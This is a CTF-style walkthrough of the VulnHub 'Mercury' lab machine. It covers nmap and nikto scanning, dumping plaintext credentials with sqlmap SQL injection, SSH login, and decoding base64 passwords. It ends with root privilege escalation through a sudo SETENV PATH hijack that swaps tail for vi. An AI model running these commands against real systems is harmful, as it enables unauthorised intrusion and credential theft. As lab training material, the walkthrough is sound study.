>[!hint] Source
>You can find it [here](https://www.vulnhub.com/entry/the-planets-mercury,544/).

# Scanning : 

>[!danger] Command
>```bash
>nmap -sV -A 10.38.1.114

>[!success] Output
>```bash
>PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)
|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: WSGIServer/0.2 CPython/3.8.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Tue, 01 Aug 2023 17:03:07 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 2366
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

>[!warning] Note
>- Nothing special in the `robots.txt`, the webpage indicate that the website is under construction so nothing to see.
>- **dirb** doesn't find any interesting directories or files

# Nikto 

>[!danger] Command
>```bash
>nikto -host http://10.38.1.114:8080/mercury/

>[!success] Output
>```bash
>- Nikto v2.5.0
>---------------------------------------------------------------------------
>+ Target IP:          10.38.1.114
>+ Target Hostname:    10.38.1.114
>+ Target Port:        8080
>+ Start Time:         2023-08-01 19:08:59 (GMT2)
>---------------------------------------------------------------------------
>+ Server: WSGIServer/0.2 CPython/3.8.2
>+ No CGI Directories found (use '-C all' to force check all possible dirs)
> + /SilverStream: SilverStream allows directory listing. See: https://web.archive.org/web/20011226154728/http://archives.neohapsis.com/archives/sf/pentest/2000-11/0147.html
> + /static/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
>+ 8103 requests: 0 error(s) and 2 item(s) reported on remote host
>+ End Time:           2023-08-01 19:10:36 (GMT2) (97 seconds)
>---------------------------------------------------------------------------

>[!warning] Notes
>- We use the `/SilverStream` to discover that there is a directory named `mercuryfacts/` that exists.
>- Inside it, there is a todo list of things that the developers need to make
>- We see that there is a SQL database with credentials, and that it is raw requests

# Database dumping

**We will use sqlmap to try to find any databases**

>[!danger] Command
>```bash
>sqlmap -u "10.38.1.114:8080/mercuryfacts/" --batch --dbs

>[!question] Explanation
>- `--dbs` is for discovering all database
>- `--batch` is simply to not require user input
>- `-u` is for the target's ip

>[!success] Output
>```bash
>[19:42:54] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[19:42:55] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] mercury

>[!warning] Note
>- We see that there are two MySQL databases : `information_schema` and `mercury`

## We see for the mercury database

>[!danger] Command
>```bash
>sqlmap -u "10.38.1.114:8080/mercuryfacts/" --dump-all --batch

>[!question] Explanation
> - `--dump-all` is for enumerating the tables of the database

>[!success] Output
>```bash
>Database: mercury
Table: users
[4 entries]
+----+-----------+-------------------------------+
| id | username  | password                      |
+----+-----------+-------------------------------+
| 1  | john      | johnny1987                    |
| 2  | laura     | lovemykids111                 |
| 3  | sam       | lovemybeer111                 |
| 4  | webmaster | mercuryisthesizeof0.056Earths |
+----+-----------+-------------------------------+
Database: mercury                                                                                                  
Table: facts
[8 entries]
+----+--------------------------------------------------------------+
| id | fact                                                         |
+----+--------------------------------------------------------------+
| 1  | Mercury does not have any moons or rings.                    |
| 2  | Mercury is the smallest planet.                              |
| 3  | Mercury is the closest planet to the Sun.                    |
| 4  | Your weight on Mercury would be 38% of your weight on Earth. |
| 5  | A day on the surface of Mercury lasts 176 Earth days.        |
| 6  | A year on Mercury takes 88 Earth days.                       |
| 7  | It's not known who discovered Mercury.                       |
| 8  | A year on Mercury is just 88 days long.                      |
+----+--------------------------------------------------------------+

>[!warning] Notes
>- So we see that we have two tables
>- We have one with credentials, we will focus on this one

# SSH connection

>[!warning] Notes
>- After trying all credentials, we have one that work, it is for the user `webmaster`

>[!hint] USER FLAG
>`[user_flag_8339915c9a454657bd60ee58776f4ccd]`

>[!warning] Notes
>- We then find a file named `notes.txt` which contains :
>```bash
>webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
>```
>- It is base64 encoding, and when cleared, give the password of the `linuxmaster` user

**We connect as `linuxmaster`**

# Permissions enumeration

**We first try the obvious**

>[!danger] Command
>```bash
>sudo -l

>[!success] Output
>```bash
>(root : root) SETENV: /usr/bin/check_syslog.sh

>[!question] Explanations
> - This output means that we have the right to execute the `/usr/bin/check_syslog.sh` script, and that it has root permission.
> - `SETENV` means that it can be run inside a preserved environment.

>[!warning] Notes
>- The script contains the following :
>```bash
>#!/bin/bash
tail -n 10 /var/log/syslog
>```
>- `tail` is a program that output the last part of files (the program by itself is useless for us)

# Privilege escalation

>[!warning] Notes
>- So we want to use this script, because we don't have anything else (`linpeas` script didn't give much useful informations)
>- To use this script for a root shell, we have to overwrite the program ran, aka `tail`

>[!danger] Command
>```bash
>ln -sf /usr/bin/vi tail

>[!question] Explanations
>- `ln` is a program to create *links* between files (kind of a shortcut would lead to a program)
>- `-s` is for creating a *symlink* (for linking files that aren't from the same repertories)
>- `-f` to force the creation (optional here)
>- we create a link of the `vi` text editor in our `/home` folder, and name it `tail`
>>[!info] But why are we using this specific program ?
>>- `vi` is a text editor that is by default on all linux systems
>>- `vi` allows users to run some command in it
>>- when `check_syslog.sh` will be run as root, `vi` will have admin rights which means that we will be able to act as the root

>[!danger] Command
>```bash
>export PATH=$(pwd):$PATH

>[!question] Explanations
>- So there is already a program named `tail` in our PATH (the official one)
>- This command put the new `tail` (`vi` editor really) before the official one, so that when `check_syslog.sh` will be run, it will call our `tail` program and not the official one.

>[!danger] Command
>```bash
>sudo --preserve-env=PATH /usr/bin/check_syslog.sh

>[!question] Explanations
>- We preserved our custom PATH in an environment variable, then we executed `check_syslog.sh` with `sudo` rights.
>- We are now in **admin** `vi` text editor.
>- by typing `:!/bin/bash`, we create a bash shell with root access

>[!hint] ROOT FLAG
>`[root_flag_69426d9fda579afbffd9c2d47ca31d90]`
